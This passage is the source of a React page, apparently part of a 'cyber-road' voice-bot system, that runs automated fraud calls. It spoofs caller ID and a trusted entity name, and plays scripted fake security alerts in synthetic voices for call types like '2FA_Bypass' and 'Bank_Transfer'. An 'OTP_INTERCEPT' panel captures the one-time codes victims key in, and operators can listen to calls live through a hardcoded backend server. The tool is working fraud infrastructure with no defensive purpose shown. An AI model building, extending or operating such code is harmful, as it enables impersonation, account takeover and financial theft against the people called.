"use client";

import { useState, useRef, useEffect, useCallback } from "react";
import { useAuth } from "@/lib/auth";
import {
  Phone, PhoneOff, PhoneCall, Terminal, Activity, FileText, Mic, Volume2,
  Copy, Download, RefreshCw, Clock, Layers, Globe, Hash,
  Loader2, ChevronRight, Lock, CheckCircle2, AlertTriangle,
  Target, Radio, Cpu, Database, Save, Edit3, RotateCcw,
} from "lucide-react";

/* ─── constants ─── */
const PROVIDERS = [
  { name: "AGENTV1",    id: "twilio",   tag: "STANDARD" },
  { name: "SPOOFV1", id: "noagency", tag: "SPOOF"    },
];

const CALL_TYPES = [
  "Login_Verification",
  "Password_Reset",
  "Account_Security",
  "Bank_Transfer",
  "2FA_Bypass",
  "Custom_Payload",
];

const VOICE_MODELS = [
  "SOPHIA_v2 [FEMALE/Jenny]",
  "LUNA_v4 [FEMALE/Aria]",
  "JANE_v1 [FEMALE/Jane]",
  "NANCY_v1 [FEMALE/Nancy]",
  "SARA_v1 [FEMALE/Sara]",
  "AMBER_v1 [FEMALE/Amber]",
  "CARISA_v3 [MALE/Guy]",
  "MARCUS_v1 [MALE/Davis]",
  "JASON_v1 [MALE/Jason]",
  "TONY_v1 [MALE/Tony]",
  "BRANDON_v1 [MALE/Brandon]",
  "ANDREW_v1 [MALE/Andrew]",
  "BRIAN_v1 [MALE/Brian]",
  "CHRIS_v1 [MALE/Christopher]",
  "ERIC_v1 [MALE/Eric]",
  "ROGER_v1 [MALE/Roger]",
  "STEFFAN_v1 [MALE/Steffan]"
];

const AZURE_VOICE_MAP: Record<string, string> = {
  "SOPHIA_v2": "en-US-JennyNeural",
  "LUNA_v4":   "en-US-AriaNeural",
  "JANE_v1":   "en-US-JaneNeural",
  "NANCY_v1":  "en-US-NancyNeural",
  "SARA_v1":   "en-US-SaraNeural",
  "AMBER_v1":  "en-US-AmberNeural",
  "CARISA_v3": "en-US-GuyNeural",
  "MARCUS_v1": "en-US-DavisNeural",
  "JASON_v1":  "en-US-JasonNeural",
  "TONY_v1":   "en-US-TonyNeural",
  "BRANDON_v1": "en-US-BrandonNeural",
  "ANDREW_v1": "en-US-AndrewNeural",
  "BRIAN_v1":  "en-US-BrianNeural",
  "CHRIS_v1":  "en-US-ChristopherNeural",
  "ERIC_v1":   "en-US-EricNeural",
  "ROGER_v1":  "en-US-RogerNeural",
  "STEFFAN_v1":"en-US-SteffanNeural"
};

const LANGUAGES = ["EN_US", "ES_MX", "FR_FR", "PT_BR", "DE_DE", "AR_SA"];

const STEP_KEYS = ["STEP_1", "STEP_2", "STEP_3", "GOOD_KEY", "BAD_KEY"] as const;
type StepKey = typeof STEP_KEYS[number];

const DEFAULT_SCRIPTS: Record<StepKey, string> = {
  STEP_1:   `[INIT] Hello {name}. We detected a login attempt on your {service} account from an unrecognized device. If you did NOT initiate this, press 1. If this was you, press 0 to confirm.`,
  STEP_2:   `[OTP_DELIVER] Your verification code is {code}. I repeat — {code}. This code expires in 5 minutes. Press 1 to replay. Press 9 to end.`,
  STEP_3:   `[CONFIRM] Thank you. Your account has been secured. If you authorised this action, no further steps are required.`,
  GOOD_KEY: `[GOOD_KEY] Input acknowledged. Processing request... Your account protection is now active. Thank you.`,
  BAD_KEY:  `[BAD_KEY] We could not verify your response. A security team member will contact you shortly. Stay on the line.`,
};

/* Templates are stored per call-type → per step */
type TemplateStore = Record<string, Record<StepKey, string>>;

function loadTemplates(): TemplateStore {
  if (typeof window === "undefined") return {};
  try {
    const raw = localStorage.getItem("cyberroad_templates");
    return raw ? JSON.parse(raw) : {};
  } catch { return {}; }
}

function saveTemplates(store: TemplateStore) {
  localStorage.setItem("cyberroad_templates", JSON.stringify(store));
}

function getScriptsForType(store: TemplateStore, callType: string): Record<StepKey, string> {
  return store[callType] ?? { ...DEFAULT_SCRIPTS };
}

const BACKEND_URL = "http://5.189.144.48:8000";

/* ─── log ─── */
interface LogEntry { id: number | string; ts: string; type: "info"|"ok"|"warn"|"err"|"sys"; tag: string; msg: string; }
function ts() { return new Date().toLocaleTimeString("en-US", { hour12: false, hour: "2-digit", minute: "2-digit", second: "2-digit" }); }

/* ─── component ─── */
export default function MakeCallPage() {
  const { token: userToken } = useAuth();
  const [provider, setProvider]     = useState(0);
  const [callType, setCallType]     = useState(CALL_TYPES[0]);
  const [voiceModel, setVoiceModel] = useState(VOICE_MODELS[0]);
  const [callerNum, setCallerNum]   = useState("+12655551234");
  const [recpName, setRecpName]     = useState("target_01");
  const [spoofName, setSpoofName]   = useState("Account");
  const [recpNum, setRecpNum]       = useState("+12305859999");
  const [retries, setRetries]       = useState(5);
  const [lang, setLang]             = useState(LANGUAGES[0]);

  /* call state */
  const [callState, setCallState] = useState<"idle"|"dialing"|"active"|"done"|"fail">("idle");
  const [activeCallId, setActiveCallId] = useState("");
  const [logs, setLogs]           = useState<LogEntry[]>([]);
  const [logId, setLogId]         = useState(0);
  const [duration, setDuration]   = useState(0);
  const timer = useRef<ReturnType<typeof setInterval>|null>(null);
  const pollTimer = useRef<ReturnType<typeof setInterval>|null>(null);
  const logRef = useRef<HTMLDivElement>(null);

  /* OTP intercept state */
  const [otpDigits, setOtpDigits]       = useState<string[]>([]);
  const [otpCollected, setOtpCollected] = useState("");
  const [otpFinal, setOtpFinal]         = useState("");
  const [otpStatus, setOtpStatus]       = useState<"waiting"|"collecting"|"captured"|"valid"|"invalid">("waiting");

  /* Live listen */
  const [isListening, setIsListening]   = useState(false);
  const audioRef = useRef<HTMLAudioElement|null>(null);

  /* script editor */
  const [templates, setTemplates]     = useState<TemplateStore>({});
  const [activeStep, setActiveStep]   = useState<StepKey>("STEP_1");
  const [editedScripts, setEditedScripts] = useState<Record<StepKey, string>>({...DEFAULT_SCRIPTS});
  const [isDirty, setIsDirty]         = useState(false);
  const [savedFlash, setSavedFlash]   = useState(false);

  /* Load templates from localStorage on mount */
  useEffect(() => {
    const store = loadTemplates();
    setTemplates(store);
    setEditedScripts(getScriptsForType(store, CALL_TYPES[0]));
    console.log("Dashboard linked to admin user account successfully.");
  }, []);

  /* When call type changes, load template for that type */
  useEffect(() => {
    const scripts = getScriptsForType(templates, callType);
    setEditedScripts({ ...scripts });
    setIsDirty(false);
  }, [callType, templates]);

  /* Auto-scroll log */
  useEffect(() => { if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight; }, [logs]);

  /* Script edit handler */
  const handleScriptChange = (val: string) => {
    setEditedScripts(prev => ({ ...prev, [activeStep]: val }));
    setIsDirty(true);
  };

  /* Save script for current call type */
  const handleSaveScript = () => {
    const newStore: TemplateStore = {
      ...templates,
      [callType]: { ...editedScripts },
    };
    setTemplates(newStore);
    saveTemplates(newStore);
    setIsDirty(false);
    setSavedFlash(true);
    setTimeout(() => setSavedFlash(false), 800);
  };

  /* Reset scripts to default */
  const handleResetScript = () => {
    setEditedScripts({ ...DEFAULT_SCRIPTS });
    setIsDirty(true);
  };

  /* Logging */
  const addLog = useCallback((type: LogEntry["type"], tag: string, msg: string) => {
    const id = Date.now().toString(36) + Math.random().toString(36).substring(2);
    setLogs(prev => {
      const isDupe = prev.length > 0 && prev[prev.length - 1].msg === msg && prev[prev.length - 1].tag === tag;
      if (isDupe) return prev; // Prevent rapid dupe logs in devmode
      return [...prev.slice(-200), { id, ts: ts(), type, tag, msg }];
    });
  }, []);

  /* Call actions */
  const startCall = async () => {
    if (callState === "active" || callState === "dialing") return;
    setCallState("dialing");
    setDuration(0);
    setLogs([]);
    addLog("sys",  "[SYS]",  `Initialising VoIP session via ${PROVIDERS[provider].name}...`);
    addLog("info", "[CFG]",  `Payload: ${callType} | Voice: ${voiceModel.split(" ")[0]} | Lang: ${lang}`);

    try {
      const payload = {
        target_number: recpNum,
        from_number: callerNum,
        target_name: recpName,
        services: spoofName,
        digits_otp: retries,
        call_type_id: callType,
        voice: AZURE_VOICE_MAP[voiceModel.split(" ")[0]] || "en-US-JennyNeural",
        scripts: editedScripts,
        lang: lang
      };

      const res = await fetch(BACKEND_URL + "/api/make_call", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "X-USER-TOKEN": userToken 
        },
        credentials: "omit",
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      if (!res.ok || data.error) {
        throw new Error(data.error || "Failed to make call");
      }

      addLog("ok",   "[NET]",  `Routing through relay... success! ActionID: ${data.call_id}`);
      setActiveCallId(data.call_id);
      
      // Reset OTP state
      setOtpDigits([]);
      setOtpCollected("");
      setOtpFinal("");
      setOtpStatus("waiting");
      setIsListening(false);

      // Start polling
      if (pollTimer.current) clearInterval(pollTimer.current);
      pollTimer.current = setInterval(() => pollLogs(data.call_id), 1500);
      
    } catch (err: any) {
      setCallState("fail");
      addLog("err", "[ERROR]", err.message || "Network Error");
    }
  };

  const _TERMINAL_STEPS = new Set(["Ended", "ENDED", "Busy", "BUSY", "No Answer", "NOANSWER", "Rejected", "REJECTED", "Machine", "MACHINE", "Error", "ERROR"]);

  const pollLogs = async (callId: string) => {
      try {
        const res = await fetch(BACKEND_URL + "/api/asterisk/call_updates/" + callId, {
           headers: { "X-USER-TOKEN": userToken },
           credentials: "omit" 
        });
        const data = await res.json();
        if (data.updates) {
           const mostRecent = data.updates[data.updates.length - 1];
           const topStatus = data.status || mostRecent?.status || "";

           if (mostRecent) {
             // Start call timer once past dialing
             if (!_TERMINAL_STEPS.has(topStatus) && topStatus !== "PREPARING" && topStatus !== "CALLING" && topStatus !== "Preparing" && topStatus !== "Calling") {
               if (callState !== "active") {
                  setCallState("active");
                  if (!timer.current) timer.current = setInterval(() => setDuration(d => d + 1), 1000);
               }
             }
           }
           // Stop on any terminal state
           if (_TERMINAL_STEPS.has(topStatus)) {
              if (timer.current) clearInterval(timer.current);
              if (pollTimer.current) clearInterval(pollTimer.current);
              setCallState("done");
           }

           // Process OTP intercept data from updates
           for (const u of data.updates) {
             if (u.step === "DTMF" && u.digit) {
               setOtpDigits(prev => {
                 const next = [...prev, u.digit];
                 return next.slice(-10);
               });
               setOtpCollected(u.collected || "");
               setOtpStatus("collecting");
             }
             if (u.step === "OTP_CAPTURED") {
               setOtpFinal(u.collected || u.message || "");
               setOtpStatus("captured");
             }
             if (u.step === "VALID") setOtpStatus("valid");
             if (u.step === "INVALID") setOtpStatus("invalid");
             if (u.step === "PRESSED_1") setOtpStatus("collecting");
           }

           const newLogs = data.updates.map((u: any, i: number) => ({
             id: u.timestamp + i,
             ts: u.timestamp ? new Date(u.timestamp).toLocaleTimeString("en-US", {hour12:false,hour:"2-digit",minute:"2-digit",second:"2-digit"}) : ts(),
             type: (u.step === "ERROR" || u.step === "INVALID" || u.step === "BUSY" || u.step === "NOANSWER" || u.step === "REJECTED" || u.step === "MACHINE") ? "err"
                  : (u.step === "VALID" || u.step === "ANSWERED" || u.step === "HUMAN") ? "ok"
                  : (u.step === "OTP_CAPTURED" || u.step === "PRESSED_1" || u.step === "DTMF") ? "warn" : "info",
             tag: `[${u.step || u.status}]`,
             msg: u.message
           }));
           setLogs(prev => {
             const sysLogs = prev.filter(p => p.tag === "[SYS]" || p.tag === "[CFG]");
             return [...sysLogs, ...newLogs].slice(-200) as LogEntry[];
           });
        }
      } catch (e) {
         console.warn("Log poll failed", e);
      }
  };

  /* Live listen toggle */
  const toggleListen = () => {
    if (isListening) {
      if (audioRef.current) { audioRef.current.pause(); audioRef.current = null; }
      setIsListening(false);
      addLog("sys", "[AUDIO]", "Live listening stopped");
    } else if (activeCallId) {
      const audio = new Audio(`${BACKEND_URL}/api/asterisk/listen/${activeCallId}`);
      audio.play().catch(() => addLog("err", "[AUDIO]", "Failed to start live listen stream"));
      audioRef.current = audio;
      setIsListening(true);
      addLog("ok", "[AUDIO]", "Live listening started — streaming call audio");
    }
  };

  const endCall = async () => {
    if (timer.current) clearInterval(timer.current);
    if (pollTimer.current) clearInterval(pollTimer.current);
    if (audioRef.current) { audioRef.current.pause(); audioRef.current = null; }
    setIsListening(false);
    
    // Attempt graceful hangup
    if (activeCallId) {
      try {
        await fetch(BACKEND_URL + "/api/hangup_call", {
          method: "POST",
          headers: { 
            "Content-Type": "application/json",
            "X-USER-TOKEN": userToken
          },
          credentials: "omit",
          body: JSON.stringify({ call_id: activeCallId })
        });
      } catch (e) { }
    }
    
    addLog("warn", "[TERM]", `Operator terminated. Duration: ${fmt(duration)}`);
    setTimeout(() => {
      setCallState("done");
      addLog("ok", "[LOG]", `Session stored. Ready for next target.`);
    }, 400);
  };

  const sendOtpResult = async (result: "valid" | "invalid") => {
    if (!activeCallId) return;
    try {
      const res = await fetch(BACKEND_URL + "/api/asterisk/otp_result", {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-USER-TOKEN": userToken },
        credentials: "omit",
        body: JSON.stringify({ call_id: activeCallId, result })
      });
      const data = await res.json();
      addLog(result === "valid" ? "ok" : "err", "[OTP]", `OTP marked ${result.toUpperCase()} → ${data.status || "sent"}`);
    } catch {
      addLog("err", "[OTP]", "Failed to send OTP result");
    }
  };

  const handlePreview = async () => {
    try {
      addLog("sys", "[SYS]", `Initiating voice preview for ${voiceModel.split(" ")[0]}...`);
      
      const previewText = editedScripts[activeStep]
        .replace(/{name}/g, recpName || "John")
        .replace(/{service}/g, spoofName || "System")
        .replace(/{code}/g, "1 2 3 4 5 6")
        .replace(/{digits}/g, retries.toString())
        .replace(/{from_number}/g, callerNum || "support");

      const res = await fetch(BACKEND_URL + "/api/preview-voice", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "X-USER-TOKEN": userToken
        },
        credentials: "omit",
        body: JSON.stringify({
          target_number: recpNum,
          voice: AZURE_VOICE_MAP[voiceModel.split(" ")[0]] || "en-US-JennyNeural",
          text: previewText
        })
      });
      
      const ct = res.headers.get("Content-Type") || "";
      if (ct.includes("audio")) {
         const blob = await res.blob();
         const audio = new Audio(URL.createObjectURL(blob));
         audio.play();
         addLog("ok", "[PLAY]", `Streaming verified voice payload: ${voiceModel.split(" ")[0]}`);
      } else {
         const data = await res.json();
         if (!res.ok || data.error) throw new Error(data.error || "Failed");
      }
    } catch (err: any) {
      addLog("err", "[ERROR]", `Preview failed: ${err.message}`);
    }
  };

  const fmt = (s: number) => `${Math.floor(s/60).toString().padStart(2,"0")}:${(s%60).toString().padStart(2,"0")}`;

  const statusMap = {
    idle:    { label: "STANDBY",     sub: "No active session",   pip: "gray",  color: "var(--text-muted)",   icon: <PhoneOff size={28} style={{opacity:0.3}} /> },
    dialing: { label: "DIALING",     sub: recpNum,               pip: "amber", color: "var(--amber-warn)",   icon: <Radio size={28} color="var(--amber-warn)" className="anim-spin" /> },
    active:  { label: "CALL_ACTIVE", sub: fmt(duration),         pip: "green", color: "var(--green-matrix)", icon: <PhoneCall size={28} color="var(--green-matrix)" /> },
    done:    { label: "COMPLETED",   sub: `${fmt(duration)} elapsed`, pip: "gray", color: "var(--cyan-hack)", icon: <CheckCircle2 size={28} color="var(--cyan-hack)" /> },
    fail:    { label: "CALL_FAILED", sub: "Connection dropped",  pip: "red",   color: "var(--red-alert)",    icon: <AlertTriangle size={28} color="var(--red-alert)" /> },
  };
  const cs = statusMap[callState];

  return (
    <div className="page-content" style={{ padding: "20px 24px", maxWidth: "1400px" }}>

      {/* ── Header ── */}
      <div style={{ marginBottom: "18px" }}>
        <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "4px" }}>
          <Terminal size={14} color="var(--green-dim)" />
          <span style={{ fontFamily: "var(--font-mono)", fontSize: "10px", color: "var(--text-muted)" }}>/root/voip/</span>
          <ChevronRight size={10} color="var(--text-ghost)" />
          <span style={{ fontFamily: "var(--font-mono)", fontSize: "10px", color: "var(--green-matrix)" }}>make_call.exe</span>
          {callState === "active" && (
            <span style={{ marginLeft: "auto", display: "flex", alignItems: "center", gap: "6px", fontFamily: "var(--font-mono)", fontSize: "11px", color: "var(--green-matrix)", background: "rgba(0,255,65,0.06)", border: "1px solid var(--border-bright)", padding: "4px 10px" }}>
              <span className="status-pip green" /> LIVE // {fmt(duration)}
            </span>
          )}
        </div>
        <h1 style={{ fontFamily: "var(--font-display)", fontSize: "18px", fontWeight: 700, color: "var(--green-matrix)", letterSpacing: "0.08em", textShadow: "0 0 20px rgba(0,255,65,0.5)", display: "flex", alignItems: "center", gap: "10px" }}>
          <Phone size={18} /> MAKE_CALL <span className="cursor" />
        </h1>
        <div style={{ fontFamily: "var(--font-mono)", fontSize: "10px", color: "var(--text-muted)", marginTop: "2px" }}>
          // cyber-road voip bot call system v2.4
        </div>
      </div>

      {/* ── Top Row: Provider + Session Status ── */}
      <div className="responsive-grid-main" style={{ display: "grid", gridTemplateColumns: "1fr 340px", gap: "16px", marginBottom: "16px" }}>
        {/* Provider */}
        <div className="cyber-panel" style={{ padding: "12px 16px" }}>
          <div style={{ fontFamily: "var(--font-mono)", fontSize: "10px", color: "var(--text-muted)", marginBottom: "10px" }}>
            // SELECT_PROVIDER_RELAY
          </div>
          <div className="responsive-grid-2col" style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: "8px" }}>
            {PROVIDERS.map((p, i) => (
              <button key={p.id} className={`prov-tab ${provider === i ? "active" : ""}`} onClick={() => setProvider(i)}>
                <div style={{ fontSize: "8px", opacity: 0.6, marginBottom: "1px" }}>[{p.tag}]</div>
                {p.name}
              </button>
            ))}
          </div>
        </div>

        {/* Session Status (compact) */}
        <div className="cyber-panel">
          <div className="panel-header" style={{ paddingBottom: "6px", marginBottom: "8px" }}>
            <Activity size={13} color="var(--green-dim)" />
            <span className="panel-header-label">SESSION_STATUS</span>
            <span className="status-pip" style={{ marginLeft: "auto" }}>
              <span className={`status-pip ${cs.pip}`} />
            </span>
          </div>
          <div style={{ padding: "0 16px 12px", display: "flex", alignItems: "center", gap: "14px" }}>
            {cs.icon}
            <div style={{ flex: 1 }}>
              <div style={{ fontFamily: "var(--font-display)", fontSize: "12px", fontWeight: 700, color: cs.color, letterSpacing: "0.1em", textShadow: `0 0 10px ${cs.color}` }}>{cs.label}</div>
              <div style={{ fontFamily: "var(--font-mono)", fontSize: "11px", color: "var(--text-muted)", marginTop: "2px" }}>{cs.sub}</div>
            </div>
            {/* Live Listen button inline */}
            <button
              className={`hbtn ${isListening ? "hbtn-listen-active" : "hbtn-exec"}`}
              style={{ padding: "8px 12px", fontSize: "10px", fontWeight: 700, letterSpacing: "0.04em", whiteSpace: "nowrap" }}
              onClick={toggleListen}
              disabled={!activeCallId || callState !== "active"}
            >
              {isListening ? <><Volume2 size={12} className="anim-flicker" /> LIVE</> : <><Radio size={12} /> LISTEN</>}
            </button>
          </div>
        </div>
      </div>

      {/* ── Main grid ── */}
      <div className="responsive-grid-main" style={{ display: "grid", gridTemplateColumns: "1fr 340px", gap: "16px" }}>

        {/* ── LEFT ── */}
        <div style={{ display: "flex", flexDirection: "column", gap: "16px", minWidth: 0 }}>

          {/* Call Config */}
          <div className="cyber-panel">
            <div className="panel-header">
              <Cpu size={13} color="var(--green-dim)" />
              <span className="panel-header-label">CALL_CONFIGURATION</span>
              <span className="bracket-label">[TARGET_SETUP]</span>
            </div>
            <div style={{ padding: "0 16px 16px" }}>
              <div className="responsive-grid-2col" style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px" }}>

                {/* Call Type */}
                <div>
                  <label className="h-label"><Layers size={9} />CALL_TYPE</label>
                  <select className="h-input" value={callType} onChange={e => setCallType(e.target.value)}>
                    {CALL_TYPES.map(t => <option key={t}>{t}</option>)}
                  </select>
                </div>

                {/* Voice */} 
                <div>
                  <label className="h-label"><Mic size={9} />VOICE_MODEL</label>
                  <select className="h-input" value={voiceModel} onChange={e => setVoiceModel(e.target.value)}>
                    {VOICE_MODELS.map(v => <option key={v}>{v}</option>)}
                  </select>
                </div>

                {/* Voice actions */}
                <div style={{ display: "flex", gap: "8px" }}>
                  <button className="hbtn hbtn-ghost" style={{ flex: 1, fontSize: "10px", padding: "6px 8px" }}>
                    <Copy size={9} /> SAVE
                  </button>
                  <button className="hbtn hbtn-ghost" style={{ flex: 1, fontSize: "10px", padding: "6px 8px" }} onClick={handlePreview}>
                    <Volume2 size={9} /> PREVIEW
                  </button>
                </div>
                <div />

                {/* Caller ID */}
                <div>
                  <label className="h-label"><Phone size={9} />CALLER_ID</label>
                  <input className="h-input" value={callerNum} onChange={e => setCallerNum(e.target.value)} placeholder="+1 000 000 0000" />
                </div>

                {/* Recipient Name */}
                <div>
                  <label className="h-label"><Target size={9} />RECIPIENT_NAME</label>
                  <input className="h-input" value={recpName} onChange={e => setRecpName(e.target.value)} placeholder="target_handle" />
                </div>

                {/* Spoof */}
                <div>
                  <label className="h-label"><Hash size={9} />SPOOF_ENTITY</label>
                  <input className="h-input" value={spoofName} onChange={e => setSpoofName(e.target.value)} placeholder="entity_name" />
                </div>

                {/* Recipient Num */}
                <div>
                  <label className="h-label"><Phone size={9} />RECIPIENT_NUM</label>
                  <input className="h-input" value={recpNum} onChange={e => setRecpNum(e.target.value)} placeholder="+1 000 000 0000" />
                </div>

                {/* Retries */}
                <div>
                  <label className="h-label"><RefreshCw size={9} />OTP_RETRIES</label>
                  <input className="h-input" type="number" min={1} max={10} value={retries} onChange={e => setRetries(+e.target.value)} />
                </div>

                {/* Language */}
                <div>
                  <label className="h-label"><Globe size={9} />LOCALE</label>
                  <select className="h-input" value={lang} onChange={e => setLang(e.target.value)}>
                    {LANGUAGES.map(l => <option key={l}>{l}</option>)}
                  </select>
                </div>
              </div>

              {/* Execute button */}
              <div style={{ marginTop: "16px" }}>
                <div className="neon-hr" style={{ marginBottom: "12px" }} />
                {callState !== "active" ? (
                  <div style={{ display: "flex", gap: "8px" }}>
                    <button
                      className="hbtn hbtn-exec"
                      style={{ flex: 1, padding: "12px 16px", fontSize: "13px", fontWeight: 700, letterSpacing: "0.08em" }}
                      onClick={startCall}
                      disabled={callState === "dialing"}
                    >
                      {callState === "dialing"
                        ? <><Loader2 size={14} className="anim-spin" /> CONNECTING...</>
                        : <><Phone size={14} /> EXECUTE_CALL [{PROVIDERS[provider].name}]</>}
                    </button>
                    {(callState === "done" || callState === "fail") && (
                      <button className="hbtn hbtn-ghost" style={{ padding: "12px 14px", fontSize: "11px" }} onClick={() => { setLogs([]); setCallState("idle"); }}>
                        <RefreshCw size={12} /> RESET
                      </button>
                    )}
                  </div>
                ) : (
                  <div style={{ display: "flex", gap: "8px" }}>
                    <button className="hbtn hbtn-exec active-call" style={{ flex: 1, padding: "12px 16px", fontSize: "13px", fontWeight: 700 }} onClick={endCall}>
                      <PhoneOff size={14} /> TERMINATE_SESSION
                    </button>
                    <div style={{ display: "flex", alignItems: "center", gap: "6px", padding: "0 14px", border: "1px solid var(--border-main)", background: "var(--green-ghost)", fontFamily: "var(--font-mono)", fontSize: "14px", fontWeight: 700, color: "var(--green-matrix)", minWidth: "90px", justifyContent: "center" }}>
                      <Clock size={12} /> {fmt(duration)}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* ── Call Script Matrix ── */}
          <div className="cyber-panel">
            <div className="panel-header">
              <FileText size={13} color="var(--green-dim)" />
              <span className="panel-header-label">CALL_SCRIPT_MATRIX</span>
              <span className="bracket-label">[EDITABLE]</span>
            </div>
            <div style={{ padding: "0 16px 16px" }}>
              {/* Step tabs */}
              <div style={{ display: "flex", gap: "6px", marginBottom: "10px", flexWrap: "wrap" }}>
                {STEP_KEYS.map(key => (
                  <button key={key} className={`step-tab ${activeStep === key ? "active" : ""}`} onClick={() => setActiveStep(key)}>
                    {key}
                  </button>
                ))}
              </div>

              {/* Active step info */}
              <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
                <span style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--green-dim)" }}>
                  // ACTIVE: {activeStep} → {callType}
                </span>
                {isDirty && (
                  <span style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--amber-warn)", display: "flex", alignItems: "center", gap: "4px" }}>
                    <Edit3 size={8} /> unsaved changes
                  </span>
                )}
                {savedFlash && (
                  <span style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--green-matrix)", display: "flex", alignItems: "center", gap: "4px" }}>
                    <CheckCircle2 size={8} /> saved!
                  </span>
                )}
              </div>

              {/* Editable textarea */}
              <div style={{ position: "relative" }}>
                <textarea
                  className={`script-textarea ${savedFlash ? "script-saved-flash" : ""}`}
                  value={editedScripts[activeStep]}
                  onChange={e => handleScriptChange(e.target.value)}
                  spellCheck={false}
                />
              </div>

              {/* Action row */}
              <div style={{ display: "flex", gap: "8px", marginTop: "10px", flexWrap: "wrap" }}>
                <button
                  className="hbtn hbtn-exec"
                  style={{ fontSize: "11px", padding: "7px 14px", opacity: isDirty ? 1 : 0.5 }}
                  onClick={handleSaveScript}
                  disabled={!isDirty}
                >
                  <Save size={12} /> SAVE_TEMPLATE [{callType}]
                </button>
                <button className="hbtn hbtn-ghost" style={{ fontSize: "11px", padding: "7px 12px" }} onClick={handleResetScript}>
                  <RotateCcw size={11} /> RESET_DEFAULT
                </button>
                <button className="hbtn hbtn-ghost" style={{ fontSize: "11px", padding: "7px 12px", marginLeft: "auto" }}
                  onClick={() => navigator.clipboard.writeText(editedScripts[activeStep])}>
                  <Copy size={11} /> COPY
                </button>
              </div>

              {/* Saved templates badge list */}
              <div style={{ marginTop: "10px", display: "flex", gap: "6px", flexWrap: "wrap" }}>
                {Object.keys(templates).length > 0 && (
                  <>
                    <span style={{ fontFamily: "var(--font-mono)", fontSize: "9px", color: "var(--text-ghost)" }}>saved_templates:</span>
                    {Object.keys(templates).map(k => (
                      <button key={k}
                        className="cyber-badge cyan"
                        style={{ cursor: "pointer", border: "none" }}
                        onClick={() => setCallType(k)}
                      >
                        {k}
                      </button>
                    ))}
                  </>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* ── RIGHT ── */}
        <div style={{ display: "flex", flexDirection: "column", gap: "16px", minWidth: 0 }}>

          {/* ── OTP INTERCEPT ── */}
          <div className="cyber-panel otp-intercept-panel">
            <div className="panel-header">
              <Lock size={13} color="var(--cyan-hack)" />
              <span className="panel-header-label" style={{ color: "var(--cyan-hack)", textShadow: "0 0 8px var(--cyan-hack)" }}>OTP_INTERCEPT</span>
              <span className="bracket-label">[REALTIME]</span>
            </div>
            <div style={{ padding: "0 16px 16px" }}>
              {/* OTP digit display */}
              <div className="otp-display-grid">
                {Array.from({ length: 6 }).map((_, i) => {
                  const digit = otpFinal ? otpFinal[i] : otpCollected ? otpCollected[i] : otpDigits[i];
                  const filled = !!digit;
                  return (
                    <div key={i} className={`otp-digit-box ${filled ? "filled" : ""} ${otpStatus === "captured" && filled ? "captured" : ""} ${otpStatus === "valid" ? "valid" : ""} ${otpStatus === "invalid" ? "invalid" : ""}`}>
                      <span className="otp-digit-value">{digit || "—"}</span>
                    </div>
                  );
                })}
              </div>

              {/* Status line */}
              <div style={{ display: "flex", alignItems: "center", gap: "8px", marginTop: "10px" }}>
                <span className={`status-pip ${
                  otpStatus === "waiting" ? "gray" :
                  otpStatus === "collecting" ? "amber" :
                  otpStatus === "captured" ? "green" :
                  otpStatus === "valid" ? "green" :
                  "red"
                }`} />
                <span style={{ fontFamily: "var(--font-mono)", fontSize: "10px", color: 
                  otpStatus === "waiting" ? "var(--text-ghost)" :
                  otpStatus === "collecting" ? "var(--amber-warn)" :
                  otpStatus === "captured" ? "var(--cyan-hack)" :
                  otpStatus === "valid" ? "var(--green-matrix)" :
                  "var(--red-alert)",
                  letterSpacing: "0.06em", textTransform: "uppercase"
                }}>
                  {otpStatus === "waiting" && "AWAITING_INPUT..."}
                  {otpStatus === "collecting" && `CAPTURING_DTMF // ${otpCollected.length} digits`}
                  {otpStatus === "captured" && `OTP_CAPTURED: ${otpFinal || otpCollected}`}
                  {otpStatus === "valid" && "✓ OTP_VERIFIED"}
                  {otpStatus === "invalid" && "✗ OTP_REJECTED"}
                </span>
              </div>

              {/* OTP Action buttons — always visible */}
              <div style={{ display: "flex", gap: "8px", marginTop: "12px" }}>
                <button
                  className="hbtn otp-btn-valid"
                  style={{ flex: 1, padding: "8px 12px", fontSize: "11px", fontWeight: 700 }}
                  onClick={() => sendOtpResult("valid")}
                  disabled={!activeCallId || callState !== "active"}
                >
                  <CheckCircle2 size={12} /> VALID
                </button>
                <button
                  className="hbtn otp-btn-invalid"
                  style={{ flex: 1, padding: "8px 12px", fontSize: "11px", fontWeight: 700 }}
                  onClick={() => sendOtpResult("invalid")}
                  disabled={!activeCallId || callState !== "active"}
                >
                  <AlertTriangle size={12} /> INVALID
                </button>
              </div>

              {/* Copy OTP */}
              {(otpFinal || otpCollected) && (
                <div style={{ marginTop: "8px" }}>
                  <button className="hbtn hbtn-ghost" style={{ width: "100%", fontSize: "10px", padding: "6px 10px" }}
                    onClick={() => { navigator.clipboard.writeText(otpFinal || otpCollected); addLog("ok", "[OTP]", `Copied: ${otpFinal || otpCollected}`); }}>
                    <Copy size={10} /> COPY_OTP [{otpFinal || otpCollected}]
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* ── Live Call Log ── */}
          <div className="cyber-panel" style={{ flex: 1, display: "flex", flexDirection: "column" }}>
            <div className="panel-header">
              <Database size={13} color="var(--green-dim)" />
              <span className="panel-header-label">LIVE_CALL_LOG</span>
              <div style={{ display: "flex", gap: "4px", marginLeft: "auto" }}>
                <button className="hbtn hbtn-ghost" style={{ padding: "3px 8px", fontSize: "9px" }} onClick={() => setLogs([])}>
                  <RefreshCw size={9} /> CLR
                </button>
                <button className="hbtn hbtn-ghost" style={{ padding: "3px 8px", fontSize: "9px" }}
                  onClick={() => { const txt = logs.map(l => `${l.ts} ${l.tag} ${l.msg}`).join("\n"); navigator.clipboard.writeText(txt); }}>
                  <Copy size={9} /> CPY
                </button>
